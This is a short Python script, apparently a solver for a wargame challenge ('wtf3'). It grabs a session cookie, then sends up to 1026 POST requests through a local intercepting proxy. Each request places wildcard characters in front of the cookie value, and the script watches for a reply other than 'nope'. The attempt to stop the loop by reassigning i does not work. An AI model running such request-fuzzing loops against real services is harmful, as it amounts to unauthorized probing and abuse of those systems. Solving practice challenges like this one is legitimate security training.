import requests
import json

comodines = ["!", "{", "}", "[", "]", "-", "*", "(", ")", "^"]

proxies = {'http':'http://@localhost:8080'}
header = {'Content-Type':'application/json; charset=utf-8','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0'}

def cookie():
    cookie = requests.get('http://challenge-wargame.rhcloud.com/wtf3')
    if cookie.status_code == 200:
        return cookie.headers["Set-Cookie"].split(";")[0].replace("wtf3=","")
def consumir():
    c = cookie();
    contador = 0
    comodin = comodines[0]
    for i in range(0,1026):
        
        data = {'m':comodin+c}
        print('Consumiendo {} - {}'.format(data, str(i)))
        response = requests.post('http://challenge-wargame.rhcloud.com/wtf3?n='+ str(i), data=json.dumps(data),headers=header, proxies=proxies)
        if response.status_code == 200:
            data = json.loads(response.text)
            if (data["msg"] != 'nope'):
                print("Este es \n\n\n\n\n\n\n ")
                i=1025
        if contador >= 9:
            contador = 0
            c = cookie();
            comodin = comodines[contador]
        else:
            contador=contador+1
            comodin = comodines[contador]
            

consumir();